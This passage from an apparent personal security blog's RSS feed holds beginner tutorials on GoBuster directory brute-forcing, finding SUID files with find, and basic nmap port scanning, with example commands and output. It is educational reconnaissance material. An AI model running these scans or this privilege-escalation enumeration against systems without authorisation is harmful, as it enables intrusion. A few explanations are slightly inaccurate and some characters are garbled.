    .table-responsive-sm {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch
    }
    .table-responsive-sm>.table-bordered {
        border: 0
    }
}

@media (max-width:767.98px) {
    .table-responsive-md {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch
    }
    .table-responsive-md>.table-bordered {
        border: 0
    }
}

@media (max-width:991.98px) {
    .table-responsive-lg {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch
    }
    .table-responsive-lg>.table-bordered {
        border: 0
    }
}

@media (max-width:1199.98px) {
    .table-responsive-xl {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch
    }
    .table-responsive-xl>.table-bordered {
        border: 0
    }
}

.table-responsive {
    display: block;
    width: 100%;
    overflow-x: auto;
    -webkit-overflow-scrolling: touch
}

.table-responsive>.table-bordered {
    border: 0
}

.table-center {
   margin: auto;
   width: 100% !important; 
}
</style>

<span class="table table-center table-dark table-striped table-bordered table-hover">
    <div class="table-center">
        <table>
<thead>
<tr>
<th align="center">GoBuster flag</th>
<th align="center">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center"><strong>-e</strong></td>
<td align="center">Print the full URLs in your console</td>
</tr>
<tr>
<td align="center"><strong>-u</strong></td>
<td align="center">The target URL</td>
</tr>
<tr>
<td align="center"><strong>-w</strong></td>
<td align="center">Path to your wordlist</td>
</tr>
<tr>
<td align="center"><strong>-U</strong> and -P</td>
<td align="center">Username and Password for Basic Auth</td>
</tr>
<tr>
<td align="center"><strong>-p {proxy}</strong></td>
<td align="center">Proxy to use for requests</td>
</tr>
<tr>
<td align="center"><strong>-c {http cookies}</strong></td>
<td align="center">Specify a cookie for simulating your auth</td>
</tr>
</tbody>
</table>

    </div>
</span>
<p>GoBuster requires us to provide a wordlist in order to brute force our way through. If you are using Kali linux you most likely already have several wordlists available in the <em><strong>/usr/share/wordlists/dirbuster/</strong></em>. If you are not, you&rsquo;ll be lucky just by googling for some.</p>
<p>Now assuming we already have a worlist available, we can start our basic brute-force attack:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"> gobuster dir -u http://<span style="color:#f92672">{</span>target_IP<span style="color:#f92672">}</span>:<span style="color:#f92672">{</span>target_port<span style="color:#f92672">}</span> -w <span style="color:#f92672">{</span>wordlist_Path<span style="color:#f92672">}</span>
</code></pre></div><p>it is worth noting you can specify a host url and not only IPs. With this in mind a basic full example would look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> gobuster dir -u http://127.0.0.1:80 -w /home/oj/wordlists/shortlist.txt
</code></pre></div><p>And it&rsquo;ll produce and output similar to this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Mode         : dir
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url/Domain   : https://127.0.0.1/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads      : <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist     : /home/oj/wordlists/shortlist.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes : 200,204,301,302,307,401,403
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent   : gobuster/3.0.1
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Verbose      : true
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout      : 10s
<span style="color:#f92672">===============================================================</span>
2019/06/21 11:50:51 Starting gobuster
<span style="color:#f92672">===============================================================</span>
Missed: /alsodoesnotexist <span style="color:#f92672">(</span>Status: 404<span style="color:#f92672">)</span>
Found: /index <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
Missed: /doesnotexist <span style="color:#f92672">(</span>Status: 404<span style="color:#f92672">)</span>
Found: /categories <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
Found: /posts <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
Found: /contact <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
2019/06/21 11:50:51 Finished
<span style="color:#f92672">===============================================================</span>
</code></pre></div><p>There you have it, a basic usage of GoBuster to fuzz some directories. If you want to explore additional flags to use some advanced features and fine tune your attack. Run gobuster with the <strong>-h</strong> flag.</p>
<p>Additionaly check out <a href="https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/">this post</a> from RedTeamTutorials to see some advanced options.</p>
<p>Happy hacking.</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<div class="container" style="margin:10px !important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>    
    </div>
    
</div>

]]></content>
        </item>
        
        <item>
            <title>Get_SUID.sh</title>
            <link>https://tzero86-bits.netlify.app/posts/get_suid/</link>
            <pubDate>Sat, 15 Aug 2020 18:13:59 -0400</pubDate>
            
            <guid>https://tzero86-bits.netlify.app/posts/get_suid/</guid>
            <description>#How to locate SUID Files using Find command#  In Linux, SUID (set owner userId upon execution) is a special type of &amp;gt;file permission given to a file. SUID gives temporary permissions to a &amp;gt;user to run the program/file with the permission of the file owner (rather &amp;gt;than the user who runs it). {TryHackme}
 For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd).</description>
            <content type="html"><![CDATA[<h2 id="how-to-locate-suid-files-using-find-command">#How to locate SUID Files using Find command#</h2>
<blockquote>
<p>In Linux, <strong>SUID</strong> (set owner userId upon execution) is  a special type of &gt;file permission given to a file. <strong><em>SUID gives temporary  permissions to a &gt;user to run the program/file with the permission of  the file owner (rather &gt;than the user who runs it)</em></strong>. <strong><em>{TryHackme}</em></strong></p>
</blockquote>
<p>For example,  the binary file to change your password has the SUID bit set on it  <strong><em>(/usr/bin/passwd)</em></strong>. This is because to change your password, it will need  to write to the shadowers file that you do not have access to, root  does, so it has root privileges to make the right changes.</p>

    <img src="../img/suid.png"  alt="Hello Friend"  class="center"  style="border-radius: 1px; padding: 20px"  />


<p>Let&rsquo;s try to understand what SUID, SGID and the Stickly bits mean:</p>
<ul>
<li>
<p><strong>SUID bit</strong>:</p>
<ul>
<li>On Files: User executes the file with permissions of the owner.</li>
<li>On Directories: nothing.</li>
</ul>
</li>
<li>
<p><strong>SGID bit</strong>:</p>
<ul>
<li>On Files: User executes the file with permissions of the group owner.</li>
<li>On Directories: Files created in directory get same permissions as group owner.</li>
</ul>
</li>
<li>
<p><strong>Sticky bit</strong>:</p>
<ul>
<li>On Files: No use.</li>
<li>On Directories: Users are blocked from deleting files from other users.</li>
</ul>
</li>
</ul>
<p>SUID  bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all  sorts of issues.</p>
<p>To search the a system for these type of files, we can use the <strong>find</strong> command like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
</code></pre></div><p>This will find all files that current user <em><strong>-u=s</strong></em> has permissions <em><strong>-perm</strong></em> to access, making sure they are file type <em><strong>-type file</strong></em> and will not show any errors due to lack of access to any file <em><strong>2&gt;/dev/null</strong></em></p>
<p>Alternatively we can also do this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">find / -user root -perm /4000  2&gt;&amp;<span style="color:#ae81ff">1</span> | grep -v <span style="color:#e6db74">&#34;Permission denied&#34;</span>
</code></pre></div><ul>
<li><strong>find /</strong>: we start the search on the root directory.</li>
<li><strong>-user root</strong>: files owned by root user.</li>
<li><strong>-perm /4000</strong>: files with octal format equivalent for SUID.</li>
<li><strong>2&gt;&amp;1</strong>: redirect any standar error messages as a standar output.</li>
<li><strong>|</strong>: The pipe character takes the output of previous command as input of the next command.</li>
<li><strong>grep -v &ldquo;Permission denied&rdquo;</strong>: We use grep to filter out any result including access errors. <strong>-v</strong> means inverse, so it will skip any files with the permissions denied message in it.</li>
</ul>
<p>Happy hacking.</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<div class="container" style="margin:10px !important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>    
    </div>
    
</div>

]]></content>
        </item>
        
        <item>
            <title>Nmap_basics.sh</title>
            <link>https://tzero86-bits.netlify.app/posts/nmap_basics/</link>
            <pubDate>Sat, 15 Aug 2020 16:56:33 -0400</pubDate>
            
            <guid>https://tzero86-bits.netlify.app/posts/nmap_basics/</guid>
            <description>#NMAP - Basic Usage#  nmap is an free, open-source and powerful tool used to discover hosts and services on a computer network. In our example, we are using nmap to scan this machine to identify all services that are running on a particular port. nmap has many capabilities, below &amp;gt; is a table summarizing some of the functionality it provides. {from TryHackme}
 Here are some of the basic switches/flags that your can use when running an nmap scan:</description>
            <content type="html"><![CDATA[<h2 id="nmap---basic-usage">#NMAP - Basic Usage#</h2>
<blockquote>
<p><strong>nmap</strong> is an free, open-source and powerful tool used to discover hosts and services on a computer network. In our example, we are
using nmap to scan this machine  to identify all services that are running on a particular port. nmap  has many capabilities, below &gt; is a table summarizing some of the functionality it provides.
<em>{from TryHackme}</em></p>
</blockquote>
<p>Here are some of the basic switches/flags that your can use when running an nmap scan:</p>
<style>
    .table {
    width: 100%;
    margin-bottom: 1rem;
    color: #212529
}

.table td,
.table th {
    padding: .75rem;
    vertical-align: top;
    border-top: 1px solid #dee2e6
}

.table thead th {
    vertical-align: bottom;
    border-bottom: 2px solid #dee2e6
}

.table tbody+tbody {
    border-top: 2px solid #dee2e6
}

.table-sm td,
.table-sm th {
    padding: .3rem
}

.table-bordered {
    border: 1px solid #dee2e6
}

.table-bordered td,
.table-bordered th {
    border: 1px solid #dee2e6
}

.table-bordered thead td,
.table-bordered thead th {
    border-bottom-width: 2px
}

.table-borderless tbody+tbody,
.table-borderless td,
.table-borderless th,
.table-borderless thead th {
    border: 0
}

.table-striped tbody tr:nth-of-type(odd) {
    background-color: rgba(0, 0, 0, .05)
}

.table-hover tbody tr:hover {
    color: #212529;
    background-color: rgba(0, 0, 0, .075)
}

.table-primary,
.table-primary>td,
.table-primary>th {
    background-color: #b8daff
}

.table-primary tbody+tbody,
.table-primary td,
.table-primary th,
.table-primary thead th {
    border-color: #7abaff
}

.table-hover .table-primary:hover {
    background-color: #9fcdff
}

.table-hover .table-primary:hover>td,
.table-hover .table-primary:hover>th {
    background-color: #9fcdff
}

.table-secondary,
.table-secondary>td,
.table-secondary>th {
    background-color: #d6d8db
}

.table-secondary tbody+tbody,
.table-secondary td,
.table-secondary th,
.table-secondary thead th {
    border-color: #b3b7bb
}

.table-hover .table-secondary:hover {
    background-color: #c8cbcf
}

.table-hover .table-secondary:hover>td,
.table-hover .table-secondary:hover>th {
    background-color: #c8cbcf
}

.table-success,
.table-success>td,
.table-success>th {
    background-color: #c3e6cb
}

.table-success tbody+tbody,
.table-success td,
.table-success th,
.table-success thead th {
    border-color: #8fd19e
}

.table-hover .table-success:hover {
    background-color: #b1dfbb
}

.table-hover .table-success:hover>td,
.table-hover .table-success:hover>th {
    background-color: #b1dfbb
}

.table-info,
.table-info>td,
.table-info>th {
    background-color: #bee5eb
}

.table-info tbody+tbody,
.table-info td,
.table-info th,
.table-info thead th {
    border-color: #86cfda
}

.table-hover .table-info:hover {
    background-color: #abdde5
}

.table-hover .table-info:hover>td,
.table-hover .table-info:hover>th {
    background-color: #abdde5
}

.table-warning,
.table-warning>td,
.table-warning>th {
    background-color: #ffeeba
}

.table-warning tbody+tbody,
.table-warning td,
.table-warning th,
.table-warning thead th {
    border-color: #ffdf7e
}

.table-hover .table-warning:hover {
    background-color: #ffe8a1
}

.table-hover .table-warning:hover>td,
.table-hover .table-warning:hover>th {
    background-color: #ffe8a1
}

.table-danger,
.table-danger>td,
.table-danger>th {
    background-color: #f5c6cb
}

.table-danger tbody+tbody,
.table-danger td,
.table-danger th,
.table-danger thead th {
    border-color: #ed969e
}

.table-hover .table-danger:hover {
    background-color: #f1b0b7
}

.table-hover .table-danger:hover>td,
.table-hover .table-danger:hover>th {
    background-color: #f1b0b7
}

.table-light,
.table-light>td,
.table-light>th {
    background-color: #fdfdfe
}

.table-light tbody+tbody,
.table-light td,
.table-light th,
.table-light thead th {
    border-color: #fbfcfc
}

.table-hover .table-light:hover {
    background-color: #ececf6
}

.table-hover .table-light:hover>td,
.table-hover .table-light:hover>th {
    background-color: #ececf6
}

.table-dark,
.table-dark>td,
.table-dark>th {
    background-color: #c6c8ca
}

.table-dark tbody+tbody,
.table-dark td,
.table-dark th,
.table-dark thead th {
    border-color: #95999c
}

.table-hover .table-dark:hover {
    background-color: #b9bbbe
}

.table-hover .table-dark:hover>td,
.table-hover .table-dark:hover>th {
    background-color: #b9bbbe
}

.table-active,
.table-active>td,
.table-active>th {
    background-color: rgba(0, 0, 0, .075)
}

.table-hover .table-active:hover {
    background-color: rgba(0, 0, 0, .075)
}

.table-hover .table-active:hover>td,
.table-hover .table-active:hover>th {
    background-color: rgba(0, 0, 0, .075)
}

.table .thead-dark th {
    color: #fff;
    background-color: #343a40;
    border-color: #454d55
}

.table .thead-light th {
    color: #495057;
    background-color: #e9ecef;
    border-color: #dee2e6
}

.table-dark {
    color: #fff;
    background-color: #343a40
}

.table-dark td,
.table-dark th,
.table-dark thead th {
    border-color: #454d55
}

.table-dark.table-bordered {
    border: 0
}

.table-dark.table-striped tbody tr:nth-of-type(odd) {
    background-color: rgba(255, 255, 255, .05)
}

.table-dark.table-hover tbody tr:hover {
    color: #fff;
    background-color: rgba(255, 255, 255, .075)
}

@media (max-width:575.98px) {
    .table-responsive-sm {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch
    }
    .table-responsive-sm>.table-bordered {
        border: 0
    }
}

@media (max-width:767.98px) {
    .table-responsive-md {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch
    }
    .table-responsive-md>.table-bordered {
        border: 0
    }
}

@media (max-width:991.98px) {
    .table-responsive-lg {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch
    }
    .table-responsive-lg>.table-bordered {
        border: 0
    }
}

@media (max-width:1199.98px) {
    .table-responsive-xl {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch
    }
    .table-responsive-xl>.table-bordered {
        border: 0
    }
}

.table-responsive {
    display: block;
    width: 100%;
    overflow-x: auto;
    -webkit-overflow-scrolling: touch
}

.table-responsive>.table-bordered {
    border: 0
}

.table-center {
   margin: auto;
   width: 100% !important; 
}
</style>

<span class="table table-center table-dark table-striped table-bordered table-hover">
    <div class="table-center">
        <table>
<thead>
<tr>
<th align="left">nmap flag</th>
<th align="center">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left">-sV</td>
<td align="center"><em>Attempts to determine the version of the services running</em></td>
</tr>
<tr>
<td align="left">-p {port} or -p-</td>
<td align="center"><em>Port scan for port or scan all ports</em></td>
</tr>
<tr>
<td align="left">-Pn</td>
<td align="center"><em>Disable host discovery and just scan for open ports</em></td>
</tr>
<tr>
<td align="left">-A</td>
<td align="center"><em>OS and version detection, runs integrated scripts</em></td>
</tr>
<tr>
<td align="left">-sC</td>
<td align="center"><em>Scan with the default nmap scripts</em></td>
</tr>
<tr>
<td align="left">-v</td>
<td align="center"><em>Verbose mode</em></td>
</tr>
<tr>
<td align="left">-sU</td>
<td align="center"><em>UDP port scan</em></td>
</tr>
<tr>
<td align="left">-sS</td>
<td align="center"><em>TCP SYN port scan</em></td>
</tr>
</tbody>
</table>

    </div>
</span>
<h2 id="how-to-scan-nmap-ports">#How to Scan Nmap Ports#</h2>
<p>To scan Nmap ports on a  remote system, enter the following in the terminal:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">  sudo nmap <span style="color:#f92672">{</span>target_IP<span style="color:#f92672">}</span>
</code></pre></div><p>Replace the {target_IP} with the IP address of the system youâre scanning. This is the most basic format for Nmap, and it will return information about the ports on that system. While is this a quick scan, <strong>it wont scan all ports by default</strong>. To specify all ports look at the <strong>-p-</strong> flag in the previous table.</p>
<p>In addition to scanning by IP address, you can also use the following commands to specify a target:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#To scan a host:</span>
nmap www.hostname.com

<span style="color:#75715e">#To scan a range of IP addresses (.1 â .10):</span>
nmap 192.168.0.1-10

<span style="color:#75715e">#To run Nmap on a subnet:</span>
nmap 192.168.0.1/13

<span style="color:#75715e">#To scan targets from a text file:</span>
nmap âiL textlist.txt
</code></pre></div><p>Happy hacking.</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<div class="container" style="margin:10px !important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>    
    </div>
    
</div>

]]></content>
        </item>
        
    </channel>
</rss>
